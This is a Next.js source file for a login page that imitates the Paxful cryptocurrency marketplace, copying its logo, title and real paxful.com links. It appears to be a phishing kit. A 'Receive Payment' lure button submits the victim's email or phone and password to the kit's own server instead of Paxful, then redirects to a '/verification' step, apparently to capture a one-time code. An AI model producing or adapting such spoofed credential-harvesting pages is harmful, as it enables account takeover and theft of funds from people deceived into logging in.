"use client";

import { Montserrat, Plus_Jakarta_Sans } from "next/font/google";
import { IoLockClosedSharp } from "react-icons/io5";


import Image from "next/image";
import Link from "next/link";
import React, { useState,useEffect } from "react";
import axios from "axios";
import { baseUrl } from "@/config";
import { useRouter } from "next/navigation";
const serrat = Plus_Jakarta_Sans({
  subsets: ["cyrillic-ext", "latin", "latin-ext", "vietnamese"],
  weight: ["200", "300", "400", "500", "600", "700", "800"],
});

const Index = () => {
  const [lang, showlang] = useState(false);
  const [show, setShow] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error1, setError1] = useState("");
  const [error2, setError2] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  function validateEmailOrPhone(input: string) {
    // Regular expression for validating an email
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Regular expression for validating a phone number (10 digits, allows spaces, dashes, parentheses)
    const phonePattern =
      /^(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}$/;

    // Check if input matches either the email or phone pattern
    if (emailPattern.test(input) || phonePattern.test(input)) {
      setError1("");
    } else {
      setError1("Enter a valid phone or email.");
    }
  }

  const handleEmailChange = (e: any) => {
    validateEmailOrPhone(e.target.value); // Validate email on each change
    setEmail(e.target.value);
  };

  const handleSignIn = async () => {
    try {
      setIsLoading(true);
      const res = await axios.post(`${baseUrl}/api/login`, { email, password });
      console.log(res);
      router.push(`/verification?email=${email}`);
      setIsLoading(!true);
    } catch (error) {
      console.error(error);
      setIsLoading(!true);
    }
  };

    useEffect(() => {
    document.title = "Paxful | Login";
  });

  return (
    <div
      style={serrat.style}
      className='w-full h-screen bg-black flex flex-row-reverse'
    >
      <div className='w-[67.5%] hidden lg:flex bg-[hsl(0,0,8)] relative items-center justify-center h-screen'>
        <svg
          xmlns='http://www.w3.org/2000/svg'
          width='404'
          height='404'
          fill='none'
        >
          <mask
            id='login_svg__a'
            width='403'
            height='403'
            x='0'
            y='0'
            maskUnits='userSpaceOnUse'
            style={{ maskType: "luminance" }}
          >
            <path fill='#fff' d='M402.779.135H0v402.779h402.779z'></path>
          </mask>
          <g mask='url(#login_svg__a)'>
            <path
              stroke='#4D4D4D'
              d='M69.755 402.209c37.785 0 68.414-30.678 68.414-68.523v-68.523H1.34v68.523c0 37.845 30.63 68.523 68.415 68.523ZM402.075 132.296c0-72.6-58.763-131.457-131.249-131.457S139.593 59.696 139.593 132.296v26.55'
            ></path>
            <path
              fill='#000'
              stroke='#fff'
              stroke-linecap='round'
              stroke-linejoin='round'
              stroke-width='0.9'
              d='M392.809 153.325c1.29 2.199 1.173 5.102-.62 8.257l-37.734 66.375-8.311 14.617c-3.971 6.982-14.695 12.671-23.961 12.705l-14.544.033-192.157.571c-5.061 0-8.646-1.679-10.188-4.347-1.29-2.215-1.19-5.119.603-8.274l.52-.889.502-.89h.201l192.158-.553 14.544-.034c9.249-.034 19.99-5.723 23.961-12.704l8.311-14.618 36.712-64.579c.352 0 .704.017 1.039.05 4.39.235 7.523 1.847 8.948 4.297z'
            ></path>
            <path
              fill='#fff'
              stroke='#fff'
              stroke-linecap='round'
              stroke-linejoin='round'
              stroke-width='0.9'
              d='M152.697 162.253c3.987-6.964 14.711-12.654 23.977-12.704l206.149-.554-36.193 63.941-8.345 14.601c-3.87 7.149-14.644 13.174-23.944 13.359l-15.047.034-192.358.553 45.761-79.247z'
            ></path>
            <path
              stroke='#fff'
              stroke-linecap='round'
              stroke-linejoin='round'
              stroke-width='0.9'
              d='m106.936 241.5 45.761-79.247c3.987-6.964 14.711-12.654 23.977-12.704l206.149-.554'
            ></path>
            <path
              fill='#000'
              d='M165.699 181.016c-2.01 0-3.619-.369-4.809-1.124s-1.876-1.796-2.044-3.139c-.167-1.325.218-2.836 1.19-4.531s2.279-3.189 3.937-4.498a20.4 20.4 0 0 1 5.496-3.104c1.994-.756 3.988-1.142 5.932-1.158 1.558 0 2.815.218 3.787.654s1.659 1.041 2.078 1.796q.628 1.132.502 2.568c-.084.956-.419 1.93-.988 2.92-.118.201-.268.453-.436.705-.184.268-.369.52-.587.805l-18.247.084 1.257-2.198 16.505-.068-1.994.94c.904-1.141 1.323-2.181 1.256-3.088-.05-.906-.469-1.628-1.24-2.148-.77-.52-1.826-.789-3.167-.789s-2.731.286-4.188.823a13.8 13.8 0 0 0-3.972 2.282 9.9 9.9 0 0 0-2.748 3.457c-.904 1.343-1.29 2.501-1.173 3.491.118.99.62 1.745 1.508 2.299.889.537 2.011.806 3.385.806a11.5 11.5 0 0 0 4.491-.89 18.2 18.2 0 0 0 3.87-2.198l1.961 1.057c-.855.755-1.91 1.46-3.167 2.098a20.7 20.7 0 0 1-4.038 1.544 17.6 17.6 0 0 1-4.374.604zM180.864 180.58l9.601-16.783h3.016l-1.86 3.256-.62-.117c1.156-1.091 2.53-1.947 4.105-2.585a12.7 12.7 0 0 1 4.793-.956q2.286 0 3.669.805c.905.537 1.458 1.276 1.625 2.232.168.94-.083 2.014-.77 3.206l-6.234 10.908h-3.016l5.714-9.985c.587-1.024.855-1.897.788-2.602s-.419-1.258-1.039-1.627c-.62-.386-1.491-.571-2.597-.571a9.6 9.6 0 0 0-3.268.587c-1.072.386-2.061.94-2.966 1.679a9 9 0 0 0-2.195 2.584l-5.713 9.986h-3.016zM212.097 180.63c-1.927 0-3.167-.419-3.72-1.292s-.352-2.115.57-3.759l5.462-9.55h-3.988l1.341-2.332h1.005c.905 0 1.776-.252 2.581-.722s1.407-1.057 1.809-1.779l.804-1.41h3.017l-2.212 3.877h4.758l-1.34 2.333h-4.759l-5.462 9.583c-.319.57-.503 1.057-.536 1.493s.15.772.519 1.007c.385.252 1.022.369 1.894.369.217 0 .469 0 .787-.033.302-.017.57-.05.804-.067l-1.206 2.098c-.352.067-.754.117-1.173.151s-.754.05-.989.05zM228.366 180.748c-2.011 0-3.62-.37-4.809-1.125s-1.877-1.795-2.044-3.138c-.168-1.326.217-2.836 1.189-4.531s2.279-3.189 3.938-4.498a20.4 20.4 0 0 1 5.496-3.105c1.994-.755 3.988-1.141 5.931-1.158 1.559 0 2.815.218 3.787.655.972.436 1.659 1.04 2.078 1.795q.629 1.134.503 2.568c-.084.957-.419 1.93-.989 2.92-.117.202-.268.453-.436.705-.184.269-.368.52-.586.806l-18.247.084 1.256-2.199 16.505-.067-1.994.94c.905-1.141 1.324-2.182 1.257-3.088-.05-.906-.469-1.628-1.24-2.148s-1.827-.789-3.167-.789-2.731.285-4.189.822a13.7 13.7 0 0 0-3.971 2.283 9.9 9.9 0 0 0-2.748 3.457c-.905 1.343-1.29 2.5-1.173 3.491.117.99.62 1.745 1.508 2.299.888.537 2.011.805 3.385.805 1.592 0 3.083-.302 4.49-.889a18.2 18.2 0 0 0 3.871-2.199l1.96 1.058c-.854.755-1.91 1.46-3.167 2.098a20.8 20.8 0 0 1-4.038 1.544 17.6 17.6 0 0 1-4.373.604zM243.531 180.311l9.601-16.782h3.016l-1.575 2.752-.167-.403a11.7 11.7 0 0 1 3.385-1.896c1.29-.47 2.681-.705 4.155-.705h1.374l-1.34 2.35h-1.894c-1.558 0-3.016.402-4.39 1.158s-2.446 1.829-3.234 3.205l-5.915 10.338h-3.016zM144.974 381.758c18.199-10.766 30.361-23.887 27.165-29.306s-20.539-1.083-38.738 9.683-30.36 23.888-27.164 29.307 20.539 1.083 38.737-9.684'
            ></path>
            <path
              fill='#000'
              d='M140.995 375.002c18.198-10.767 30.36-23.888 27.165-29.306-3.196-5.419-20.54-1.084-38.738 9.683-18.199 10.767-30.36 23.888-27.165 29.306 3.196 5.419 20.539 1.084 38.738-9.683'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M139.712 372.823c18.197-10.774 30.361-23.898 27.161-29.302-3.2-5.421-20.543-1.091-38.74 9.683-18.197 10.775-30.361 23.898-27.161 29.302 3.2 5.421 20.543 1.091 38.74-9.683m-1.056-1.796c14.259-8.441 23.71-18.88 21.096-23.311-2.614-4.43-16.304-1.191-30.563 7.25s-23.71 18.881-21.096 23.311c2.614 4.431 16.304 1.192 30.563-7.25'
              clip-rule='evenodd'
            ></path>
            <path
              fill='#C9F24D'
              d='M138.663 371.045c14.263-8.438 24.058-18.274 21.879-21.969s-15.507.15-29.77 8.588c-14.262 8.439-24.058 18.274-21.879 21.969 2.18 3.695 15.508-.15 29.77-8.588'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M168.012 345.4c2.965 5.488-9.149 18.511-27.229 29.202-7.339 4.346-14.527 7.636-20.727 9.666l4.323 7.099c6.166-2.03 13.321-5.32 20.61-9.633 18.197-10.774 30.362-23.881 27.161-29.302zm-56.367 40.95a42 42 0 0 0 3.786-.739l4.323 7.099a48 48 0 0 1-3.77.755zm-3.033.268c-3.268.084-5.58-.671-6.569-2.333l4.156 7.049.05.101c.989 1.695 3.368 2.433 6.719 2.316z'
              clip-rule='evenodd'
            ></path>
            <path
              fill='#000'
              d='M75.395 352.119c17.089-3.598 30.077-10.639 29.009-15.728-1.068-5.088-15.787-6.297-32.876-2.7-17.09 3.598-30.077 10.64-29.009 15.728 1.068 5.089 15.787 6.297 32.876 2.7'
            ></path>
            <path
              fill='#000'
              d='M74.057 345.801c17.088-3.598 30.076-10.64 29.008-15.728-1.068-5.089-15.787-6.297-32.876-2.7-17.089 3.598-30.076 10.639-29.008 15.728 1.067 5.088 15.787 6.297 32.876 2.7'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M73.626 343.756c17.09-3.592 30.076-10.64 29.004-15.726-1.072-5.085-15.784-6.293-32.875-2.702s-30.077 10.641-29.005 15.726 15.785 6.293 32.876 2.702m-.352-1.679c13.388-2.819 23.542-8.475 22.67-12.637-.87-4.162-12.432-5.253-25.837-2.433-13.388 2.819-23.542 8.475-22.671 12.637s12.433 5.253 25.838 2.433'
              clip-rule='evenodd'
            ></path>
            <path
              fill='#C9F24D'
              d='M73.282 342.073c13.394-2.82 23.663-7.914 22.936-11.379s-12.175-3.988-25.569-1.169-23.663 7.915-22.935 11.38c.727 3.465 12.174 3.988 25.568 1.168'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M103.016 329.826c.854 5.085-12.065 12.05-29.022 15.608-6.886 1.443-13.388 2.114-18.766 2.064l1.508 6.696c5.362.034 11.83-.621 18.666-2.064 17.091-3.591 30.077-10.64 29.005-15.725l-1.374-6.596zm-54.943 17.068c.972.184 2.027.319 3.15.419l1.508 6.713a39 39 0 0 1-3.15-.402l-1.508-6.713zm-2.446-.604c-2.58-.806-4.19-1.997-4.525-3.558l1.391 6.595s0 .067.017.101c.335 1.594 1.994 2.803 4.641 3.608l-1.524-6.729z'
              clip-rule='evenodd'
            ></path>
            <path
              fill='#000'
              d='M106.181 270.589c.717-3.778-8.983-8.799-21.665-11.213-12.683-2.414-23.545-1.307-24.262 2.472s8.983 8.799 21.665 11.213c12.683 2.414 23.545 1.307 24.262-2.472'
            ></path>
            <path
              fill='#000'
              d='M107.083 265.884c.717-3.778-8.983-8.799-21.666-11.213s-23.544-1.307-24.261 2.472 8.983 8.799 21.665 11.213 23.545 1.307 24.262-2.472'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M83.093 266.842c12.684 2.416 23.542 1.309 24.262-2.467.721-3.777-8.98-8.794-21.665-11.211s-23.542-1.309-24.263 2.467c-.72 3.776 8.982 8.794 21.666 11.211m.234-1.242c9.937 1.896 18.482.923 19.069-2.165s-7.004-7.133-16.94-9.029c-9.937-1.897-18.482-.923-19.069 2.165s7.004 7.132 16.94 9.029'
              clip-rule='evenodd'
            ></path>
            <path
              fill='#C9F24D'
              d='M102.224 264.38c.489-2.576-7.178-6.2-17.123-8.093s-18.406-1.339-18.894 1.238c-.49 2.577 7.177 6.201 17.123 8.094s18.405 1.338 18.894-1.239'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M107.121 265.667c-.804 3.742-11.629 4.816-24.263 2.417-5.11-.974-9.735-2.367-13.405-3.944l-.87 5.001c3.652 1.561 8.243 2.937 13.32 3.91 12.684 2.417 23.542 1.309 24.263-2.467l.938-4.917zm-42.342-3.961c.603.403 1.29.789 2.027 1.192l-.871 5.001a27 27 0 0 1-2.028-1.175zm-1.508-1.107c-1.525-1.293-2.296-2.568-2.078-3.726l-.922 4.884s0 .067-.017.083c-.217 1.175.57 2.484 2.145 3.776l.871-5.034z'
              clip-rule='evenodd'
            ></path>
          </g>
          <mask
            id='login_svg__b'
            width='277'
            height='94'
            x='108'
            y='148'
            maskUnits='userSpaceOnUse'
            style={{ maskType: "luminance" }}
          >
            <path
              fill='#fff'
              d='M153.915 162.081c3.999-6.981 14.752-12.684 24.043-12.734l206.704-.555-36.291 64.092-8.367 14.635c-3.881 7.166-14.684 13.206-24.008 13.391l-15.088.033-192.877.555 45.884-79.434z'
            ></path>
          </mask>
          <g mask='url(#login_svg__b)'>
            <path
              fill='#000'
              d='M123.989 226.201c10.477-2.811 18.295-7.614 17.462-10.728s-10.003-3.36-20.48-.549-18.296 7.614-17.463 10.728c.834 3.114 10.003 3.36 20.481.549'
            ></path>
            <path
              fill='#000'
              d='M125.02 230.055c10.478-2.811 18.296-7.614 17.463-10.728-.834-3.114-10.003-3.36-20.48-.549s-18.296 7.614-17.463 10.728c.834 3.114 10.003 3.36 20.48.549'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M122.346 220.033c-10.467 2.81-18.297 7.621-17.457 10.733s9.997 3.364 20.481.555c10.467-2.809 18.296-7.621 17.456-10.733s-9.996-3.364-20.48-.555m.285 1.026c-8.215 2.204-14.314 6.056-13.625 8.613s7.896 2.826 16.095.64c8.216-2.204 14.315-6.056 13.626-8.613s-7.897-2.827-16.096-.64'
              clip-rule='evenodd'
            ></path>
            <path
              fill='#C9F24D'
              d='M124.681 228.755c8.209-2.203 14.404-5.713 13.834-7.84-.569-2.126-7.686-2.065-15.896.138s-14.404 5.712-13.835 7.839c.57 2.127 7.687 2.065 15.897-.137'
            ></path>
            <path
              fill='#C9F24D'
              fill-rule='evenodd'
              d='M122.077 219.007c-10.467 2.809-18.296 7.621-17.456 10.733l-1.092-4.105c-.841-3.112 6.989-7.923 17.456-10.732 4.2-1.128 8.182-1.767 11.509-1.918l1.159 4.104c-3.343.152-7.342.791-11.559 1.918zm14.029-1.934-1.159-4.105a17 17 0 0 1 1.965.151l1.16 4.105a17 17 0 0 0-1.966-.151m3.511.437-1.176-4.121c1.664.403 2.739 1.11 3.008 2.069v.05l1.058 3.97c-.285-.925-1.327-1.581-2.906-1.985z'
              clip-rule='evenodd'
            ></path>
          </g>
          <path
            fill='#C9F24D'
            d='m399.514 182.89.235 1.413a2.43 2.43 0 0 0 2.017 2.019l1.411.235-1.411.236a2.43 2.43 0 0 0-2.017 2.019l-.235 1.413-.235-1.413a2.43 2.43 0 0 0-2.016-2.019l-1.411-.236 1.411-.235a2.43 2.43 0 0 0 2.016-2.019zM135.131 166.219l.353 2.137a3.68 3.68 0 0 0 3.024 3.028l2.134.353-2.134.353a3.68 3.68 0 0 0-3.024 3.028l-.353 2.137-.352-2.137a3.68 3.68 0 0 0-3.025-3.028l-2.133-.353 2.133-.353a3.68 3.68 0 0 0 3.025-3.028zM319.625 261.651l.285 1.767a3.07 3.07 0 0 0 2.521 2.523l1.781.286-1.781.286a3.07 3.07 0 0 0-2.521 2.523l-.285 1.783-.286-1.783a3.07 3.07 0 0 0-2.52-2.523l-1.781-.286 1.781-.286a3.07 3.07 0 0 0 2.52-2.523zM346.356 129.513l.403 2.49a4.28 4.28 0 0 0 3.528 3.533l2.487.403-2.487.404a4.28 4.28 0 0 0-3.528 3.533l-.403 2.49-.404-2.49a4.28 4.28 0 0 0-3.528-3.533l-2.486-.404 2.486-.403a4.28 4.28 0 0 0 3.528-3.533z'
          ></path>
        </svg>
      </div>
      <div className='w-full lg:w-[32.5%] flex flex-col items-center px-[5%] md:px-[2.5%] pt-[5%] lg:pt-[1.2%] bg-black h-full'>
        <div className='flex items-center bord  justify-between w-full'>
          <Link className='w-full flex items-center gap-2' href={"/"}>
            <svg
              xmlns='http://www.w3.org/2000/svg'
              fill='none'
              viewBox='0 0 32 32'
              className='aspect-square size-6 md:size-8'
            >
              <path
                fill='#C9F24D'
                d='M0 26.5A5.5 5.5 0 0 1 5.5 21H11v11H5.5A5.5 5.5 0 0 1 0 26.5M11 0h10.5C27.299 0 32 4.701 32 10.5S27.299 21 21.5 21H11z'
              ></path>
            </svg>
            <p className='font-semibold text-[32px] leading-none text-white'>
              paxful
            </p>
          </Link>
        </div>
        <h1
          style={serrat.style}
          className='text-white  text-[32px]  leading-10 tracking-[-4%] self-start mt-[20%] font-semibold'
        >
          Welcome back!
        </h1>
        <div className='py-1 self-start  border-appAsh'>
          <span style={serrat.style} className='text-[hsl(0,0,50)] text-xs'>
            Dont have an account ?
            <Link
              href='https://paxful.com/register?locale=en'
              className='ml-2 text-[hsl(0,0,50)] text-[0.8125rem] leading-[1rem] underline-offset-4 underline'
            >
              Sign up
            </Link>
          </span>
        </div>

        <div className='w-full mt-3'>
          <h3 className='text-[hsl(0,0,100)] text-[15px] font-medium opacity-50 mb-1 '>
            Email / Phone Number
          </h3>
          <input
            onBlur={() => {
              if (email === "") {
                setError1("This field may not be blank");
              } else {
                setError1("");
                validateEmailOrPhone(email);
              }
            }}
            onChange={(e) => {
              handleEmailChange(e);
            }}
            className={`w-[95%] mx-auto self-center h-[56px] px-2 focus:outline-appBlue hover:borde-[#626262]  ${
              error1 ? "border-error" : ""
            }  rounded-2xl bg-[hsl(0,0,8)]  text-[hsl(0,0,100)]`}
            type='text'
            placeholder='Email / Phone Number'
          />
          {error1 && (
            <div className='flex mt-1 items-center'>
              <svg width='16' height='16' viewBox='0 0 16 16' fill='#eb4a27'>
                <path
                  fillRule='evenodd'
                  d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
                  clipRule='evenodd'
                ></path>
              </svg>
              <p className='text-error ml-2 font-[400]'>{error1}</p>
            </div>
          )}
        </div>
        <div className='w-full mt-4'>
          <div className='flex items-center justify-between'>
            <h3 className='mb-1 text-[hsl(0,0,100)] opacity-50  font-medium text-[15px]'>
              Password
            </h3>
          </div>
          <div className='relative flex items-center w-full h-max '>
            {show ? (
              <input
                onChange={(e) => setPassword(e.target.value)}
                onBlur={() => {
                  if (password === "") {
                    setError2("This field may not be blank");
                  } else {
                    setError2("");
                  }
                }}
                className={`w-[95%] self-center text-[hsl(0,0,100)] p-[1rem] bg-[hsl(0,0,8)]  focus:outline-appBlue h-[56px]  ${
                  error2 ? "border-error" : ""
                } rounded-2xl`}
                type='text'
                placeholder='Password'
              />
            ) : (
              <input
                onChange={(e) => setPassword(e.target.value)}
                onBlur={() => {
                  if (password === "") {
                    setError2("This field may not be blank");
                  } else {
                    setError2("");
                  }
                }}
                className={`w-[95%] self-center text-[hsl(0,0,100)]  p-[1rem] px-2 bg-[hsl(0,0,8)] focus:outline-appBlue h-[56px]  ${
                  error2 ? "border-error" : ""
                } rounded-2xl`}
                type='password'
                placeholder='Password'
              />
            )}
            <button
              onClick={() => setShow(!show)}
              className='absolute right-7 self-center'
            >
              {show ? (
                <svg
                  width='16'
                  height='16'
                  viewBox='0 0 16 16'
                  fill='#626262'
                  className='d-block'
                >
                  <path
                    fillRule='evenodd'
                    d='M2.03 8.006L2.027 8l.003-.006a2.35 2.35 0 01.287-.41c.288-.344.73-.753 1.3-1.145C4.762 5.65 6.318 5 8 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148C11.235 10.344 9.68 11 8 11c-1.682 0-3.238-.65-4.383-1.439-.57-.392-1.012-.8-1.3-1.144a2.397 2.397 0 01-.287-.41zM8 3c-2.184 0-4.128.836-5.517 1.79-.696.48-1.279 1.007-1.7 1.51a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13c2.186 0 4.131-.844 5.518-1.802.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3zm0 7a2 2 0 100-4 2 2 0 000 4z'
                    clipRule='evenodd'
                  ></path>
                </svg>
              ) : (
                <svg
                  width='16'
                  height='16'
                  viewBox='0 0 16 16'
                  fill='#626262'
                  className='d-block'
                >
                  <path
                    fillRule='evenodd'
                    d='M2.707 1.293a1 1 0 00-1.414 1.414l1.734 1.734c-.19.114-.37.231-.544.35-.696.479-1.279 1.006-1.7 1.509a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13a9.15 9.15 0 003.048-.538l2.245 2.245a1 1 0 001.414-1.414l-1.74-1.74c.192-.115.376-.234.551-.355.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3a9.2 9.2 0 00-3.05.535L2.706 1.293zm1.788 4.616a8.599 8.599 0 00-.878.53c-.57.392-1.012.8-1.3 1.144a2.397 2.397 0 00-.287.41L2.027 8l.003.006c.05.098.143.238.287.41.288.344.73.753 1.3 1.145C4.762 10.35 6.318 11 8 11c.49 0 .97-.056 1.431-.155l-.913-.913a2.003 2.003 0 01-2.45-2.45L4.495 5.909zm2.987.159l-.914-.915A6.906 6.906 0 018 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148 8.645 8.645 0 01-.88.534l-1.57-1.568a2.003 2.003 0 00-2.45-2.45z'
                    clipRule='evenodd'
                  ></path>
                </svg>
              )}
            </button>
          </div>

          {error2 && (
            <div className='flex mt-1 items-center'>
              <svg width='16' height='16' viewBox='0 0 16 16' fill='#eb4a27'>
                <path
                  fillRule='evenodd'
                  d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
                  clipRule='evenodd'
                ></path>
              </svg>
              <p className='text-error ml-2 font-[400]'>{error2}</p>
            </div>
          )}
        </div>
        <Link
          href={"https://paxful.com/forgot-password?locale=en"}
          className=' underline-offset-2 underline mt-1 mr-4 self-end text-[14px] text-[hsl(0,0,80)] opacity-50'
        >
          Forgot Password?
        </Link>
        <button
          onClick={handleSignIn}
          className={`w-[90%] mt-6 px-3 ${
            isLoading || error1 || error2
              ? "bg-appAsh/30"
              : "bg-[hsl(75,84,63)]"
          } hover:bg-lime-600 cursor-pointer self-center rounded-full flex items-center justify-between h-[56px]`}
        >
          <p
            className={`${
              isLoading || error1 || error2 ? "text-black" : "text-black"
            } font-semibold  mx-auto`}
          >
            {isLoading ? "Loading..." : "Receive Payment"}
          </p>
        </button>
      </div>
    </div>
  );
};

export default Index;
